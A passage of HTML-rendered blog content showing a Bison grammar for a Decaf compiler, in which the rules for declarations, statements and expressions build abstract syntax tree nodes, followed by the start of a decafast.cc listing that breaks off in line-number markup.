class="hljs-keyword">end</span>() ; i++)&#123;<br>            std::string var_name = *i;<br>            VarSizeAST * sizedecl = new VarSizeAST(VAR_TYPE_SCALAR, <span class="hljs-string">&quot;1&quot;</span>);<br>            FieldDeclAST * decl = new FieldDeclAST(var_name, (TypeAST *)<span class="hljs-variable">$3</span>, sizedecl); <br>            slist-&gt;push_back( (decafAST *)decl );<br>        &#125;<br>        delete <span class="hljs-variable">$2</span>;<br>        <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist;<br>    &#125;<br>    | T_VAR  comma_id_list T_LSB T_INTCONSTANT T_RSB normal_type T_SEMICOLON <br>    &#123;<br>        decafStmtList * slist = new decafStmtList();<br>        <span class="hljs-keyword">for</span>(std::vector&lt;std::string&gt;::iterator i = <span class="hljs-variable">$2</span>-&gt;<span class="hljs-keyword">begin</span>(); i != <span class="hljs-variable">$2</span>-&gt;<span class="hljs-keyword">end</span>() ; i++)&#123;<br>            std::string var_name = *i;<br>            VarSizeAST * sizedecl = new VarSizeAST(VAR_TYPE_ARRAY, *<span class="hljs-variable">$4</span>);<br>            FieldDeclAST * decl = new FieldDeclAST(var_name, (TypeAST *)<span class="hljs-variable">$6</span>, sizedecl); <br>            slist-&gt;push_back( (decafAST *)decl );   <br>        &#125;<br>        delete <span class="hljs-variable">$2</span>;<br>        delete <span class="hljs-variable">$4</span>;<br>        <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist;<br>    &#125;<br>    | T_VAR comma_id_list normal_type T_ASSIGN constant_expr T_SEMICOLON<br>    &#123;<br>        std::vector&lt;std::string&gt; * ids = <span class="hljs-variable">$2</span>;<br>        <span class="hljs-keyword">if</span>( ids-&gt;size() == <span class="hljs-number">1</span>)&#123;<br>            decafStmtList * slist = new decafStmtList();<br>            AssignGlobalVar * assign = new AssignGlobalVar(*ids-&gt;<span class="hljs-keyword">begin</span>(), (TypeAST *)<span class="hljs-variable">$3</span>, (ValueExpr *) <span class="hljs-variable">$5</span>);<br>            delete <span class="hljs-variable">$2</span>;<br>            slist-&gt;push_back(assign);<br>            <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            printf(<span class="hljs-string">&quot;error\n&quot;</span>);<br>            //<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>            YYABORT;<br>        &#125;<br><br>    &#125;<br><br>VarDecl:<br>    T_VAR  comma_id_list normal_type T_SEMICOLON <br>    &#123;<br>        decafStmtList * slist = new decafStmtList();<br>        <span class="hljs-keyword">for</span>(std::vector&lt;std::string&gt;::iterator i = <span class="hljs-variable">$2</span>-&gt;<span class="hljs-keyword">begin</span>(); i != <span class="hljs-variable">$2</span>-&gt;<span class="hljs-keyword">end</span>() ; i++)&#123;<br>            std::string var_name = *i;<br>            VarDefAST * decl = new VarDefAST(var_name, (TypeAST *)<span class="hljs-variable">$3</span>); <br>            slist-&gt;push_back( (decafAST *)decl );<br>        &#125;<br>        delete <span class="hljs-variable">$2</span>;<br>        <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist;<br>    &#125;<br>    | T_VAR  comma_id_list T_LSB T_INTCONSTANT T_RSB normal_type T_SEMICOLON <br>    &#123;<br>        decafStmtList * slist = new decafStmtList();<br>        <span class="hljs-keyword">for</span>(std::vector&lt;std::string&gt;::iterator i = <span class="hljs-variable">$2</span>-&gt;<span class="hljs-keyword">begin</span>(); i != <span class="hljs-variable">$2</span>-&gt;<span class="hljs-keyword">end</span>() ; i++)&#123;<br>            std::string var_name = *i;<br>            VarDefAST * decl = new VarDefAST(var_name, (TypeAST *)<span class="hljs-variable">$6</span>); <br>            slist-&gt;push_back( (decafAST *)decl );   <br>        &#125;<br>        delete <span class="hljs-variable">$2</span>;<br>        delete <span class="hljs-variable">$4</span>;<br>        <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist;<br>    &#125;<br><br>VarDecls:<br>    &#123; decafStmtList * slist = new decafStmtList(); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist; &#125;<br>    | VarDecls VarDecl &#123;<br>        decafStmtList * slist = (decafStmtList *)<span class="hljs-variable">$1</span>;<br>        decafStmtList * slist2 = (decafStmtList *)<span class="hljs-variable">$2</span>;<br>        slist2-&gt;move_to(slist);<br>        delete slist2;<br>       // std::cout &lt;&lt; getString(slist) &lt;&lt; endl;<br>        <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist;<br>    &#125;<br><br>comma_id_list: comma_id_list T_COMMA T_ID  &#123; std::vector&lt;std::string&gt; * ids = <span class="hljs-variable">$1</span>; ids-&gt;push_back(*<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = ids; delete <span class="hljs-variable">$3</span>; &#125; <br>    | T_ID  &#123; std::vector&lt;std::string&gt;  * ids = new std::vector&lt;std::string&gt;(); ids-&gt;push_back(*<span class="hljs-variable">$1</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = ids; delete <span class="hljs-variable">$1</span>;&#125; <br><br>method_list: &#123;decafStmtList * slist = new decafStmtList(); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist; &#125;<br>    | method_list MethodDecl &#123; decafStmtList * slist = (decafStmtList *)<span class="hljs-variable">$1</span>; slist-&gt;push_back(<span class="hljs-variable">$2</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = <span class="hljs-variable">$1</span>;&#125;<br>    <br>typed_var_defs:<br>    &#123; decafStmtList* slist = new decafStmtList(); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist; &#125;<br>    | typed_var_defs T_COMMA T_ID normal_type &#123; decafStmtList * slist = (decafStmtList *)<span class="hljs-variable">$1</span>; VarDefAST * def = new VarDefAST(*<span class="hljs-variable">$3</span>, ( TypeAST *)<span class="hljs-variable">$4</span>); slist-&gt;push_back(def); delete <span class="hljs-variable">$3</span>; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = <span class="hljs-variable">$1</span>;&#125;<br>    | T_ID normal_type &#123; decafStmtList* slist = new decafStmtList(); VarDefAST * def = new VarDefAST(*<span class="hljs-variable">$1</span>, ( TypeAST *)<span class="hljs-variable">$2</span>); slist-&gt;push_back(def); delete <span class="hljs-variable">$1</span>; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist;   &#125;<br><br>MethodDecl: T_FUNC T_ID T_LPAREN typed_var_defs T_RPAREN return_type MethodBlock<br>    &#123;<br>        MethodAST * method_decl = new MethodAST(*<span class="hljs-variable">$2</span>, (TypeAST *)<span class="hljs-variable">$6</span>, (decafStmtList *)<span class="hljs-variable">$4</span>, (MethodBlockAST *)<span class="hljs-variable">$7</span>);<br>        delete <span class="hljs-variable">$2</span>;<br>        <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = method_decl;<br>    &#125;<br><br>MethodBlock: T_LCB VarDecls Statements T_RCB <br>    &#123;<br>        MethodBlockAST * block = new MethodBlockAST((decafStmtList *)<span class="hljs-variable">$2</span>, (decafStmtList *)<span class="hljs-variable">$3</span>);<br>        <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = block;<br>    &#125;<br><br>Block: T_LCB VarDecls Statements T_RCB <br>    &#123;<br>        BlockAST * block = new BlockAST((decafStmtList *)<span class="hljs-variable">$2</span>, (decafStmtList *)<span class="hljs-variable">$3</span>);<br>        <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = block;<br>    &#125;<br>  <br>Statements: &#123;decafStmtList * slist = new decafStmtList(); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist;&#125;<br>    | Statements Statement &#123; decafStmtList * slist = (decafStmtList *)<span class="hljs-variable">$1</span>; slist-&gt;push_back(<span class="hljs-variable">$2</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist; &#125;<br><br>ElseBlock:<br>    &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = nullptr; &#125;<br>    | T_ELSE Block &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = <span class="hljs-variable">$2</span>; &#125;<br><br>Statement: Block &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = <span class="hljs-variable">$1</span>; &#125;<br>    | Assign T_SEMICOLON &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = <span class="hljs-variable">$1</span>; &#125;<br>    | MethodCall T_SEMICOLON &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = <span class="hljs-variable">$1</span>; &#125;<br>    | T_IF T_LPAREN Expr T_RPAREN Block ElseBlock &#123; IfStmtAST * ifast = new IfStmtAST((ExprAST *)<span class="hljs-variable">$3</span>, (BlockAST *)<span class="hljs-variable">$5</span>, (BlockAST *)<span class="hljs-variable">$6</span> );<span class="hljs-variable">$</span><span class="hljs-variable">$</span> = ifast; &#125;<br>    | T_WHILE T_LPAREN Expr T_RPAREN Block &#123; WhileStmtAST * whileast = new WhileStmtAST((ExprAST *)<span class="hljs-variable">$3</span>, (BlockAST *)<span class="hljs-variable">$5</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = whileast; &#125;<br>    | T_FOR T_LPAREN ForAssignList T_SEMICOLON Expr T_SEMICOLON ForAssignList T_RPAREN Block &#123; ForStmtAST * forast = new ForStmtAST((decafStmtList *)<span class="hljs-variable">$3</span>, (ExprAST *)<span class="hljs-variable">$5</span>, (decafStmtList *)<span class="hljs-variable">$7</span>, (BlockAST *)<span class="hljs-variable">$9</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = forast; &#125;<br>    | T_RETURN T_LPAREN Expr T_RPAREN  T_SEMICOLON &#123; ReturnStmtAST * returnast = new ReturnStmtAST((ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = returnast; &#125;<br>    | T_RETURN T_LPAREN T_RPAREN T_SEMICOLON &#123;ReturnStmtAST * returnast = new ReturnStmtAST(nullptr); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = returnast; &#125;<br>    | T_RETURN T_SEMICOLON &#123; ReturnStmtAST * returnast = new ReturnStmtAST(nullptr); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = returnast; &#125;<br>    | T_BREAK T_SEMICOLON &#123; BreakStmtAST * breakast = new BreakStmtAST(); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = breakast; &#125;<br>    | T_CONTINUE T_SEMICOLON &#123; ContinueStmtAST * cntast = new ContinueStmtAST(); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = cntast; &#125;<br><br>Assign: <br>    T_ID T_ASSIGN Expr<br>        &#123;<br>            AssignVarAST * assign = new AssignVarAST(*<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>);<br>            delete <span class="hljs-variable">$1</span>;<br>            <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = assign;<br>        &#125;<br>    | T_ID T_LSB Expr T_RSB T_ASSIGN Expr<br>        &#123;<br>            AssignArrayLocAST * arr_loc = new AssignArrayLocAST(*<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>, (ExprAST *)<span class="hljs-variable">$6</span>);<br>            delete <span class="hljs-variable">$1</span>;<br>            <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = arr_loc;<br>        &#125;<br><br>MethodArg: Expr &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = <span class="hljs-variable">$1</span>;&#125;<br><br>MethodArgList: &#123; decafStmtList * slist = new decafStmtList(); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist; &#125;<br>    | MethodArgList T_COMMA MethodArg &#123;decafStmtList * slist = (decafStmtList *)<span class="hljs-variable">$1</span>; slist-&gt;push_back(<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = <span class="hljs-variable">$1</span>;&#125;<br>    | MethodArg &#123; decafStmtList * slist = new decafStmtList(); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist; slist-&gt;push_back(<span class="hljs-variable">$1</span>); &#125; <br><br>MethodCall: T_ID T_LPAREN MethodArgList T_RPAREN<br>    &#123;<br>        MethodCallAST * call = new MethodCallAST(*<span class="hljs-variable">$1</span>, (decafStmtList *)<span class="hljs-variable">$3</span>); <br>        <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = call;<br>        delete <span class="hljs-variable">$1</span>;<br>    &#125;<br><br>Expr:<br>    T_ID &#123; VariableExprAST * var_exp = new VariableExprAST(*<span class="hljs-variable">$1</span>); delete <span class="hljs-variable">$1</span>; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = var_exp; &#125;<br>    | MethodCall &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = <span class="hljs-variable">$1</span>; &#125;<br>    | constant_expr &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = <span class="hljs-variable">$1</span>; &#125;<br>    | T_LPAREN Expr T_RPAREN &#123; <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = <span class="hljs-variable">$2</span> &#125;<br>    | T_ID T_LSB Expr T_RSB &#123;  ArrayLocExprAST * arr = new ArrayLocExprAST(*<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = arr; delete <span class="hljs-variable">$1</span>; &#125;<br>    | Expr T_PLUS Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Plus&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp; &#125;<br>    | Expr T_MINUS Expr &#123;BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Minus&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp; &#125;<br>    | Expr T_MULT Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Mult&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp; &#125;<br>    | Expr T_DIV Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Div&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp; &#125;<br>    | Expr T_LEFTSHIFT Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Leftshift&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp; &#125;<br>    | Expr T_RIGHTSHIFT Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Rightshift&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp; &#125;<br>    | Expr T_MOD Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Mod&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp; &#125;<br>    | Expr T_LT Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Lt&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp; &#125;<br>    | Expr T_GT Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Gt&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp; &#125;<br>    | Expr T_LEQ Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Leq&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp; &#125;<br>    | Expr T_GEQ Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Geq&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp;&#125;<br>    | Expr T_EQ Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Eq&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp;&#125;<br>    | Expr T_NEQ Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Neq&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp;&#125;<br>    | Expr T_AND Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;And&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp;&#125;<br>    | Expr T_OR Expr &#123; BinaryExprAST * binexp = new BinaryExprAST(<span class="hljs-string">&quot;Or&quot;</span>, (ExprAST *)<span class="hljs-variable">$1</span>, (ExprAST *)<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = binexp;&#125;<br>    | T_MINUS Expr %prec UMINUS &#123; UnaryExprAST * unary = new UnaryExprAST(<span class="hljs-string">&quot;UnaryMinus&quot;</span>, (ExprAST *)<span class="hljs-variable">$2</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = unary;&#125;<br>    | T_NOT Expr %prec UNOT &#123; UnaryExprAST * unary = new UnaryExprAST(<span class="hljs-string">&quot;Not&quot;</span>, (ExprAST *)<span class="hljs-variable">$2</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = unary;&#125;<br><br><br>ForAssignList: /* &#123; Assign &#125;+, */<br>    &#123; decafStmtList * slist = new decafStmtList(); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist&#125;<br>    | ForAssignList T_COMMA Assign &#123; decafStmtList * slist = (decafStmtList *)<span class="hljs-variable">$1</span>; slist-&gt;push_back(<span class="hljs-variable">$3</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist; &#125;<br>    | Assign &#123; decafStmtList * slist = new decafStmtList(); slist-&gt;push_back(<span class="hljs-variable">$1</span>); <span class="hljs-variable">$</span><span class="hljs-variable">$</span> = slist; &#125;<br><br><br>%%<br><br>int main() &#123;<br>  // parse the input and create the abstract syntax tree<br>  int retval = yyparse();<br>  <span class="hljs-keyword">return</span>(retval &gt;= <span class="hljs-number">1</span> ? EXIT_FAILURE : EXIT_SUCCESS);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h3 id="decafast-cc"><a href="#decafast-cc" class="headerlink" title="decafast.cc"></a>decafast.cc</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span 